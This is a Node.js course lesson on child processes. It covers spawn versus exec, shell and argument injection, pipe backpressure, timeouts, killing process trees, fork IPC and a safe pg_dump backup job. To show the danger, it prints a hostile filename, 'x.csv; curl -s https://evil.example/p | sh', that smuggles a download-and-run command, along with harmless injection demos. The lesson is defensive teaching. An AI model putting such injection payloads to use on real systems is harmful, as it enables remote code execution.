# Lesson 22 — Child processes

> **Why this lesson exists:** sooner or later a Node service has to run a program that isn't JavaScript: `pg_dump`, `ffmpeg`, `git`, a vendor's CLI. Shelling out is one of the most common sources of remote code execution, and "`spawn` vs `exec` vs `execFile` vs `fork`" is a standard interview question whose real answer is about security. The rest of this lesson covers the operational failures: a child that hangs because nobody read its output, one that outlives its parent, and a process tree you thought you'd killed.

**Time:** ~65 minutes · **Prereq:** Lesson 13

---

## 1. The idea in one sentence

> **A child process is a separate OS process you talk to through pipes: pass its arguments as an array so no shell ever parses them, consume its output as a stream so it can never block, and own its lifetime, meaning a timeout, a checked exit code, and killing its whole tree.**

---

## 2. Why child processes exist, and what they cost

Worker threads ([L21](21-worker-threads.md)) run *your JavaScript* inside your process. A child process is a different thing: **a whole new OS process**, created by `fork`+`exec` on POSIX or `CreateProcess` on Windows, running any program at all, with its own memory, its own PID and its own failure domain.

You reach for one when:
- **The work is another program:** `pg_dump` for backups, `ffmpeg` for media, `git` in a CI tool, ImageMagick, a vendor CLI.
- **You want isolation that a thread can't give:** a native library that segfaults takes down only the child; the child can have different flags or memory limits; when it exits, its memory goes back to the OS.

```text
 parent (Node)                                   child (any program)
┌──────────────────┐   stdin  pipe ───────────▶ ┌────────────────────┐
│ child.stdin      │                            │ fd 0               │
│ child.stdout     │ ◀────────── stdout pipe ── │ fd 1               │
│ child.stderr     │ ◀────────── stderr pipe ── │ fd 2               │
│ (fork only) IPC  │ ◀───────── IPC channel ──▶ │ process.send()     │
└──────────────────┘   each pipe: a small kernel buffer (64 KiB on Linux)
```

**The cost:** starting a process (and, for a Node child, booting a whole runtime) is far slower than posting a message to a worker, and everything you exchange crosses a pipe as bytes. Child processes are for coarse work, not for a function call per request.

---

## 3. The four functions

| API | Shell? | Output | Use it for |
|---|---|---|---|
| **`spawn(cmd, args)`** | No | Streams | Long-running children, big output, anything you pipe. **The default** |
| **`execFile(cmd, args)`** | No | Buffered into strings | Short commands with small output (`git rev-parse HEAD`) |
| **`exec("cmd string")`** | **Yes:** `/bin/sh -c` on POSIX, `cmd.exe` on Windows | Buffered | Trusted, constant command lines only. Never with input |
| **`fork(modulePath)`** | No | Messages over IPC | Node children you talk to with objects (§8) |

`exec` and `execFile` buffer everything the child prints, up to **`maxBuffer`, 1 MiB by default per stream**. Past it, Node kills the child and fails with `RangeError [ERR_CHILD_PROCESS_STDIO_MAXBUFFER]: stdout maxBuffer length exceeded`, with the output truncated at the limit. That's the classic "worked in dev, failed on the big customer" bug: the dev database dumped 200 KB, production dumped 5 MB. **If output size depends on data, use `spawn` and stream it.**

```ts
import { execFile } from "node:child_process";
import { promisify } from "node:util";
const execFileP = promisify(execFile);

const { stdout } = await execFileP("git", ["rev-parse", "HEAD"], { timeout: 5_000 });
// On failure it rejects with an error carrying code (the exit code), signal, killed, stdout and stderr
```

The `*Sync` variants (`execFileSync`, `spawnSync`) block the event loop until the child exits. They're fine in a CLI or a build script. **In a server, they freeze every request for the child's whole runtime** ([L08](../02-event-loop/08-blocking-the-loop.md)).

---

## 4. Shell injection, argument injection, and Windows

### What a shell does with your string

`exec` hands a single string to a shell, and a shell is a programming language: `;` and `&&` chain commands, `|` pipes, `$(…)` and backticks substitute, `>` redirects, `*` globs, and spaces split words. **Interpolate input into that string and the input becomes code.**

```ts
// file = "x.csv; curl -s https://evil.example/p | sh"
exec(`gzip -k ${file}`);                          // ❌ the shell runs gzip, then curl | sh: RCE

await execFileP("gzip", ["-k", "--", file]);      // ✅ no shell: argv reaches execve() as an array
```

With `execFile` or `spawn`, there is no parser in between: the kernel's `execve` receives `["gzip", "-k", "--", "x.csv; curl …"]`, and `;` is just a byte inside one argument. Even without an attacker, the shell version breaks on a filename containing a space. **The fix is structural, not escaping:** an args array, and never `shell: true` with anything that came from outside.

Node 24 enforces part of this: passing an args array *together with* `shell: true` prints **`DEP0190`**, because Node only joins the arguments with spaces, it doesn't escape them.

### Argument injection: the array isn't the whole fix

The program itself still parses its arguments. A "filename" of `--output=/etc/cron.d/x` or `-rf` is read as an *option* by many CLIs. Defences, in order:

1. **`--` before positional arguments** (end of options) for programs that follow the getopt convention.
2. **Validate against an allowlist:** `/^[\w.-]+\.csv$/`, a known set of formats, an ID you looked up yourself.
3. **Pass absolute paths you constructed** (`path.join(base, id + ".csv")`, with the traversal check from [L15](../03-data-and-io/15-the-file-system.md)), so nothing starts with `-`.
4. **Keep secrets out of argv.** Any local user can read every process's arguments with `ps`; pass credentials through `env` or a file.

### Windows: `.bat` and `.cmd` always involve a shell

A batch file can only be run by `cmd.exe`, and `cmd.exe` re-parses the command line with its own rules (`&`, `^`, `%VAR%` expanding even inside quotes), which don't match the quoting rules Node uses for normal programs. Correct escaping isn't reliably possible. That's **BatBadBut (CVE-2024-27980, April 2024)**: Node now **refuses to spawn `.bat`/`.cmd` files without `shell: true`, and `spawn("x.cmd")` throws `EINVAL` synchronously** rather than emitting `'error'`.

Two Windows consequences you'll hit in tooling: `spawn("npm", …)` fails with `ENOENT` (npm is `npm.cmd`, and without a shell only real executables are found), and `spawn("npm.cmd", …)` fails with `EINVAL`. Use `shell: true` with a **constant** command line and no user input, or run the `.js` entry point with `process.execPath`. Also note that **`exec` uses `cmd.exe` on Windows even when you launched Node from Git Bash**, so the injection separator is `&`, not `;`.

---

## 5. stdio, pipes and backpressure

```ts
spawn("pg_dump", args, { stdio: ["ignore", "pipe", "pipe"] });
//                               stdin     stdout  stderr
// "pipe": a stream on child.stdin/.stdout/.stderr   "inherit": share the parent's fd
// "ignore": /dev/null (NUL on Windows)               a number: an fd you opened   "ipc": fork's channel
```

**Why children hang.** A pipe is a fixed-size kernel buffer (64 KiB on Linux). Node reads from it into the stream's internal buffer until that reaches its `highWaterMark` (64 KiB for byte streams on Linux, 16 KiB on Windows, [L13](../03-data-and-io/13-streams-and-backpressure.md)), then stops reading because nobody is consuming. The kernel buffer fills, and **the child's next `write()` blocks forever.** The child never exits, `'close'` never fires, and your `await` never returns. On Linux, a child that writes 10 MB to a `"pipe"`'d stdout you never read stops after roughly the first 128 KiB (your 64 KiB plus the kernel's).

The same applies to stderr: piping stderr and ignoring it hangs a chatty child just as surely. Rules:
- **Consume every pipe you open:** stream it somewhere, or capture it with a cap that keeps reading past the cap.
- **If you don't need it, don't pipe it:** use `"ignore"` or `"inherit"`.

This is also what makes children *good* citizens in a pipeline. `await pipeline(child.stdout, createGzip(), createWriteStream(path))` carries backpressure across the process boundary: when the disk is slow, gzip stops reading, `child.stdout` stops reading, the kernel pipe fills, and the child blocks in `write()` until there's room. **The child is throttled by your slowest stage, with no memory growth anywhere.**

Writing *to* a child: `child.stdin` is a Writable with the usual `write()`/`'drain'` contract. If the child exits before reading everything, your next write fails with `EPIPE`, delivered as an `'error'` on `child.stdin`. Attach a handler or it crashes the parent ([L11](../03-data-and-io/11-eventemitter.md)).

---

## 6. Lifecycle: `'exit'` vs `'close'`, codes and signals

| Event | Fires when | Arguments |
|---|---|---|
| `'spawn'` | The OS started the process | — |
| `'error'` | It couldn't be spawned (`ENOENT`, `EACCES`), couldn't be killed, or was aborted via `signal` | `err` |
| `'exit'` | **The process ended.** Its stdio streams may still be open | `code`, `signal` |
| `'close'` | **After `'exit'` and after every stdio stream has closed** | `code`, `signal` |

The gap between `'exit'` and `'close'` is real. If the child started a background grandchild that inherited its stdout, the child exits but the pipe stays open until the grandchild exits too:

```ts
const child = spawn("sh", ["-c", "sleep 3 & echo started"]);
child.on("exit", () => console.log("exit"));     // ~50 ms
child.on("close", () => console.log("close"));   // ~3 s: the backgrounded sleep held stdout
```

**Use `'close'` whenever you consume output**, because it's the moment you have all of it. `'exit'` only tells you the PID is gone.

Exactly one of `code` and `signal` is non-null. A child killed by SIGTERM reports `code: null, signal: "SIGTERM"`. The `128 + n` numbers you've seen (143, 137) are a *shell* and Docker convention ([L03](../01-foundations/03-the-process.md)): run the same program through `sh -c` and Node sees `code: 143, signal: null`, because the shell exited normally with that status. And **a non-zero exit is not an `'error'` for `spawn`**: nothing fails unless you check `code` yourself. (`execFile` rejects for you.)

`events.once(child, "close")` resolves with `[code, signal]` and rejects on `'error'`, which is exactly the contract you want. Note that some failures don't wait for an event at all: the Windows `.cmd` refusal throws from `spawn()` itself.

---

## 7. Timeouts, cancellation, and killing the tree

`spawn`, `execFile`, `exec` and `fork` accept:
- **`timeout`** (ms): after it, Node sends `killSignal` (default `SIGTERM`). `execFile` then rejects with `killed: true, signal: "SIGTERM"`.
- **`signal`:** an `AbortSignal` ([L10](../02-event-loop/10-cancellation-and-concurrency.md)). Aborting kills the child and emits `'error'` with an `AbortError`.

Both kill **one PID**. If that process started children of its own (a shell running a pipeline, `npm` running a script, a CLI that forks workers), **they keep running.**

| | POSIX (Linux, macOS, WSL2) | Windows |
|---|---|---|
| Kill one process | `child.kill("SIGTERM")`, escalate to `SIGKILL` after a grace period | `child.kill()` is always a forced termination: there's no SIGTERM to catch |
| Kill the tree | Spawn with `detached: true` (the child leads a new process group), then `process.kill(-child.pid, "SIGTERM")`: a **negative PID signals the whole group** | `taskkill /pid <pid> /T /F` |
| When the parent dies | Children are **re-parented** to PID 1 (or a subreaper) and keep running: orphans | A non-detached child dies with its parent (libuv puts it in a job object); a `detached` one survives |

`detached: true` on POSIX has a side effect: the group no longer receives your terminal's Ctrl+C, so **you** must kill it on shutdown ([L24](24-graceful-shutdown.md)).

**Zombies.** When a process exits, the kernel keeps a small entry (its exit status) until the parent collects it with `waitpid`. Until then it's a zombie: `<defunct>` in `ps`. libuv reaps Node's own children automatically. The trap is inside containers: orphaned *grandchildren* are re-parented to PID 1, and if PID 1 is `node`, nothing reaps them, because Node only waits for processes it spawned. They pile up until the PID table runs out. **The fix is a real init (tini, or `docker run --init`) as PID 1**, covered in [L24](24-graceful-shutdown.md).

---

## 8. `fork` and IPC

`fork(modulePath)` starts `process.execPath` (another Node) running that module, with an extra **IPC channel**: `child.send(obj)` in the parent, `process.on("message")` and `process.send()` in the child.

```ts
const child = fork(new URL("./render.ts", import.meta.url), [], { serialization: "advanced" });
child.send({ statementId: "st_01J…", from: new Date("2026-10-01") });
child.on("message", (msg) => handle(msg));
child.on("exit", (code, signal) => log.warn({ code, signal }, "renderer exited"));
```

| `serialization` | Encoding | `Date` | `Map` | `BigInt` |
|---|---|---|---|---|
| `"json"` (default) | `JSON.stringify` | ❌ arrives as a string | ❌ arrives as `{}` | ❌ `send()` throws `TypeError` |
| `"advanced"` | V8's serializer (structured clone, [L21](21-worker-threads.md)) | ✅ | ✅ | ✅ |

Every message is serialized, copied through the kernel, and parsed on the other side, so batch your messages. `send()` returns `false` when the channel is closed or the unsent backlog has grown too large: that's your backpressure signal. **An open IPC channel keeps both processes alive** ([L03](../01-foundations/03-the-process.md)): the child must `process.disconnect()` (or the parent `child.disconnect()`) for either side to exit naturally. A child that should die with its parent can exit on `process.on("disconnect")`.

**`fork` vs a worker thread:** fork when you need crash isolation (a native addon that can segfault), different Node flags or heap limits, a hard kill from the OS, or memory returned to the OS on exit. Use a worker when you want cheap startup, cheap messages, transfer and shared memory. For CPU work in Ledger, workers win; `fork` is for things you don't trust to share your address space.

---

## 9. A safe runner: `lib/run.ts`

Everything above, in one function: args array, no shell, both pipes drained with a cap, a deadline that kills the tree, and a structured result instead of an exception for non-zero exits.

```ts
// lib/run.ts
import { spawn } from "node:child_process";
import { once } from "node:events";
import type { Readable } from "node:stream";

export type RunResult = { code: number | null; signal: NodeJS.Signals | null;
  stdout: string; stderr: string; truncated: boolean };

export async function run(cmd: string, args: readonly string[], opts: {
  timeoutMs: number; maxOutput?: number; signal?: AbortSignal; env?: NodeJS.ProcessEnv; cwd?: string;
}): Promise<RunResult> {
  const child = spawn(cmd, args, {
    stdio: ["ignore", "pipe", "pipe"], shell: false,      // ✅ argv as an array, no parser in between
    detached: process.platform !== "win32",               // its own process group: killable as a tree
    env: opts.env, cwd: opts.cwd,
  });
  const out = capture(child.stdout, opts.maxOutput ?? 1 << 20);
  const err = capture(child.stderr, 64 * 1024);
  const deadline = AbortSignal.any([AbortSignal.timeout(opts.timeoutMs), ...(opts.signal ? [opts.signal] : [])]);
  const onAbort = () => {
    killTree(child.pid, "SIGTERM");
    setTimeout(() => killTree(child.pid, "SIGKILL"), 5_000).unref();   // escalate if it ignores SIGTERM
  };
  deadline.addEventListener("abort", onAbort, { once: true });
  try {
    const [code, signal] = (await once(child, "close")) as [number | null, NodeJS.Signals | null];
    return { code, signal, stdout: out.text(), stderr: err.text(), truncated: out.truncated() || err.truncated() };
  } finally {
    deadline.removeEventListener("abort", onAbort);
  }
}

function capture(stream: Readable, max: number) {
  const chunks: Buffer[] = [];
  let kept = 0;
  let seen = 0;
  stream.on("data", (chunk: Buffer) => {               // ✅ keep draining past the cap, or the child blocks
    seen += chunk.length;
    if (kept >= max) return;
    const part = chunk.subarray(0, max - kept);
    chunks.push(part);
    kept += part.length;
  });
  return { text: () => Buffer.concat(chunks).toString("utf8"), truncated: () => seen > kept };
}

function killTree(pid: number | undefined, sig: NodeJS.Signals): void {
  if (pid === undefined) return;                                   // it never started
  if (process.platform === "win32") {
    spawn("taskkill", ["/pid", String(pid), "/T", "/F"], { stdio: "ignore" }).on("error", () => {});
    return;
  }
  try { process.kill(-pid, sig); } catch { /* the group is already gone */ }
}
```

The caller decides what a non-zero code means: `git diff --quiet` exits 1 to say "there are differences", which isn't a failure.

---

## 10. Ledger: the nightly backup export

Ledger's backup job dumps Postgres, gzips it and writes it to disk before upload. It has to run in constant memory, fail loudly, never leave a half-written file that looks valid, and stop when the worker is shutting down.

```ts
// jobs/backup.ts
import { spawn } from "node:child_process";
import { once } from "node:events";
import { createWriteStream } from "node:fs";
import { rename, rm } from "node:fs/promises";
import { pipeline } from "node:stream/promises";
import { createGzip } from "node:zlib";

export async function backup(dest: string, signal: AbortSignal): Promise<void> {
  const tmp = `${dest}.${process.pid}.tmp`;
  const child = spawn("pg_dump", ["--format=plain", "--no-owner", "--no-privileges"], {
    stdio: ["ignore", "pipe", "pipe"],
    env: { PATH: process.env.PATH, PGHOST: config.pg.host, PGUSER: config.pg.user,    // ✅ secrets in env
           PGDATABASE: config.pg.database, PGPASSWORD: config.pg.password },          // ❌ never in argv
    timeout: 30 * 60_000,                    // SIGTERM after 30 minutes
    signal,                                  // aborted by the shutdown sequence (L24)
  });
  const stderr = capture(child.stderr, 64 * 1024);      // the helper from lib/run.ts
  try {
    const [, [code, sig]] = await Promise.all([
      pipeline(child.stdout, createGzip(), createWriteStream(tmp)),   // backpressure reaches pg_dump
      once(child, "close") as Promise<[number | null, NodeJS.Signals | null]>,
    ]);
    if (code !== 0) throw new Error(`pg_dump failed (code=${code}, signal=${sig}): ${stderr.text()}`);
    await rename(tmp, dest);                 // publish atomically; L15 adds the fsync for durability
  } catch (err) {
    child.kill();                            // harmless if it already exited
    await rm(tmp, { force: true });          // never leave a truncated dump behind
    throw err;
  }
}
```

Details that matter:
- **Passing `env` replaces the whole environment.** Copy what the program needs: `PATH` always, and on Windows also `SystemRoot`, which some programs fail without.
- **Exit code *and* stream completion.** `pipeline` resolving only means the bytes stopped; a dump that died halfway also "finishes". `code === 0` is the success signal, and the gzip trailer being written is not.
- **Plain format plus gzip.** `pg_dump --format=custom` is already compressed, so gzipping it would waste CPU. Pick one.
- **`Promise.all` subscribes to both promises**, so whichever rejects second doesn't become an unhandled rejection.

---

## 11. Production rules

| Rule | Why |
|---|---|
| **Use `spawn`/`execFile` with an args array; never `exec` with input** | No shell means no metacharacter ever becomes code |
| **Never `shell: true` with untrusted data** | Node only joins args with spaces; Node 24 warns with `DEP0190` |
| **Put `--` before positional args and validate against an allowlist** | The program itself parses options: argument injection survives the array |
| **Keep secrets out of argv** | Any local user can read process arguments with `ps` |
| **Stream output with `spawn` when its size depends on data** | `exec`/`execFile` die at `maxBuffer` (1 MiB) with truncated output |
| **Consume or ignore every pipe you open** | A full pipe blocks the child forever |
| **Wait for `'close'`, then check `code` and `signal`** | `'exit'` can fire before output is complete; a non-zero exit isn't an `'error'` |
| **Give every child a `timeout` or `signal`, and kill the tree** | Killing one PID leaves its children running |
| **Handle `'error'` on the child and on `child.stdin`** | `ENOENT` and `EPIPE` arrive as events and crash the parent if unhandled |
| **Never use `*Sync` in a server** | It blocks the event loop for the child's whole lifetime |
| **Run containers with a real init (tini) if you spawn anything** | Node as PID 1 doesn't reap orphaned grandchildren |
| **On Windows, run `.cmd`/`.bat` only with a constant command line** | They always go through `cmd.exe`; that's BatBadBut |

> **Spring equivalent:** Java's `ProcessBuilder` takes an argument list and starts no shell unless you explicitly run `sh -c`, the same safe shape as `execFile`, and it has the same full-pipe hang if you don't read `getInputStream()`. The Spring track lists command injection next to SpEL injection in [SpringBoot L28](https://github.com/Pawar-Pratik/SpringBoot/blob/main/07-security/28-authorization-and-hardening.md); the API track's rule is in [API L16](https://github.com/Pawar-Pratik/API-mastery/blob/main/03-security/16-owasp-and-hardening.md).

---

## 12. Interview traps

**Q1. "`spawn` vs `exec` vs `execFile` vs `fork`?"**
`spawn` starts a program with no shell and gives you streams: the default for anything long-running or large. `execFile` is the same without a shell but buffers output into strings (1 MiB `maxBuffer`). `exec` runs a string through `/bin/sh` or `cmd.exe` and buffers: convenient, and an injection vector the moment input touches the string. `fork` starts a Node child with an IPC channel for messages. The weak answer stops at "streams vs buffers"; the strong one leads with **"`exec` is the only one that involves a shell"**.

**Q2. "How do you prevent command injection?"**
Don't build command strings: pass an args array to `execFile`/`spawn` so the arguments reach `execve` as an array and no shell interprets them, and never combine `shell: true` with input. **Follow-up:** "Is the array alone enough?" No: the program parses its own options, so a value like `--output=/etc/x` is argument injection. Put `--` before positional args, validate against an allowlist, and pass paths you constructed yourself.

**Q3. "Why did my child process hang?"**
Almost always a full pipe: you piped stdout or stderr and never read it, so Node stopped reading at its `highWaterMark`, the 64 KiB kernel buffer filled, and the child blocked in `write()`. It never exits, so `'close'` never fires. Consume every pipe (even with a capped capture that keeps draining) or set it to `"ignore"`.

**Q4. "How do you kill a process tree?"**
On POSIX, spawn with `detached: true` so the child leads a new process group, then `process.kill(-pid, "SIGTERM")` to signal the whole group, escalating to `SIGKILL` after a grace period. On Windows, `taskkill /pid <pid> /T /F`. `child.kill()` alone only signals one PID, and whatever it started keeps running.

**Q5. "`'exit'` vs `'close'`?"**
`'exit'` fires when the process ends; `'close'` fires after that *and* after all its stdio streams have closed. A backgrounded grandchild holding the stdout pipe can delay `'close'` long after `'exit'`. If you're collecting output, wait for `'close'`.

**Q6. "Why do `.bat` and `.cmd` files need special care on Windows?"**
They can only run through `cmd.exe`, whose parsing rules don't match the argument quoting Node uses, so escaping can't be made reliable. After BatBadBut (CVE-2024-27980, April 2024), Node refuses to spawn them without `shell: true` and throws `EINVAL`. Run them only with constant command lines, or call the underlying executable directly.

**Q7. "What happens to a child when its parent is SIGKILLed?"**
On POSIX, nothing: it's re-parented to PID 1 (or a subreaper) and keeps running as an orphan, holding its ports and files, because SIGKILL ran none of your cleanup. On Windows, a non-detached child dies with the parent because libuv places it in a job object. Defences on POSIX: a child that exits when its stdin closes or its IPC channel disconnects, and supervisors that kill by process group.

**Q8. "What's a zombie process, and why do they show up in containers?"**
A process that has exited but whose status no parent has collected with `waitpid`. Node reaps its own children, but in a container orphans are re-parented to PID 1, and if PID 1 is `node` it never reaps processes it didn't spawn, so zombies accumulate until PIDs run out. Run tini (`docker run --init`) as PID 1.

**Q9. "`fork` vs worker threads?"**
`fork` gives a separate process: crash isolation, separate heap limits and flags, killable by the OS, memory returned on exit, but slow startup and IPC that serializes through the kernel. Workers are threads: fast to start, cheap messages, transfer and `SharedArrayBuffer`, but one native crash takes everything down. CPU work you trust goes to workers; code you don't trust in your address space goes to a child.

**Q10. "How does backpressure work across a child process?"**
Through the pipe. When your consumer is slow, Node stops reading `child.stdout`, the kernel pipe fills, and the child blocks in `write()` until there's room. With `pipeline(child.stdout, gzip, file)`, a slow disk throttles `pg_dump` itself, and memory stays flat in both processes.

---

## 13. Build & break

### Build — `lib/run.ts`
Implement §9 and test it: a successful command returns `code: 0` and its stdout; a command that prints 5 MB with `maxOutput: 1024` returns 1,024 characters, `truncated: true`, and *exits* (proving the drain); a `node -e "setInterval(() => {}, 1000)"` with `timeoutMs: 500` returns `signal: "SIGTERM"` on POSIX (on Windows the forced `taskkill` shows up as `code: 1, signal: null`); a nonexistent command rejects with `ENOENT`; and (in WSL2) a `sh -c "sleep 60 & sleep 60"` tree leaves no `sleep` behind after the timeout (`pgrep sleep`).

### Build — `jobs/backup.ts`
Implement §10 against the Docker Compose Postgres (put `pg_dump` on your PATH, or run the job inside a container that has it). Verify: a good run produces a `.sql.gz` that `gunzip -t` accepts; a wrong password gives a clear error containing pg_dump's stderr and leaves **no** file at `dest`; aborting the signal mid-dump kills `pg_dump` and removes the temp file; RSS stays flat while dumping (log `process.memoryUsage().rss` every second).

### Break — 6 experiments
1. **Injection, harmlessly.** `exec(\`echo ${name}\`)` with `name = "x; echo PWNED"` on POSIX, or `"x & echo PWNED"` on Windows, because `exec` uses `cmd.exe` there even from Git Bash. **PWNED** prints: a second command ran. Switch to `execFileP("echo", [name])` (in WSL2; on Windows use `node -e "console.log(process.argv[1])"` as the program): the whole string prints literally.
2. **`maxBuffer`.** `exec` a command that prints 2 MB (`node -e "process.stdout.write('x'.repeat(2*1024*1024))"`). Read the `RangeError [ERR_CHILD_PROCESS_STDIO_MAXBUFFER]` and check `err.stdout.length`: exactly 1,048,576. Rewrite with `spawn` piped to a file.
3. **The chatty child.** `spawn` a child that writes 10 MB to stdout with `stdio: ["ignore", "pipe", "inherit"]` and never read it. After 2 s the child still hasn't exited and `child.stdout.readableLength` is 65,536. Call `child.stdout.resume()` and watch it finish instantly.
4. **`'exit'` before `'close'`.** Run the `sh -c "sleep 3 & echo started"` snippet from §6 (it works in Git Bash). Note the ~3 s gap, then explain which event your output-collecting code must wait for.
5. **The orphan (WSL2).** A parent spawns `sleep 300` and idles. `kill -9` the parent, then `ps -o pid,ppid,cmd -C sleep`: the sleep lives on, re-parented (PPID 1 or a subreaper). Repeat with `detached: true` and a SIGTERM handler that does `process.kill(-child.pid)`: send SIGTERM and the sleep is gone. On Windows, try the same with Task Manager and note the difference: the non-detached child dies with its parent.
6. **BatBadBut.** On Windows, create `hi.cmd` containing `@echo hi` and call `spawn("hi.cmd")`: it **throws** `EINVAL` (wrap it in try/catch, not an `'error'` listener). Then `spawn("npm", ["-v"])`: `ENOENT` via `'error'`. Make it work with `shell: true` and a constant command line, and note the `DEP0190` warning if you also pass an args array.

### Explain out loud (60–120 seconds)
1. The four functions, and which one involves a shell.
2. Shell injection, why the args array fixes it structurally, and what argument injection still needs.
3. Why a child hangs on a full pipe, and how `pipeline` turns the pipe into backpressure.
4. `'exit'` vs `'close'`, and why a non-zero exit is not an `'error'`.
5. Killing a tree on POSIX and Windows, orphans, and zombies under PID 1.

---

## What's next

You can now run JavaScript on several threads and other programs in other processes. The next question is how to use every core for *request handling* itself, on a 16-core VM and in Kubernetes, and why "more processes" turns your in-memory state, CPU limits and memory flags into bugs.

Next → **[Lesson 23: Scaling out: cluster, containers & cores](23-cluster-and-scaling.md)**
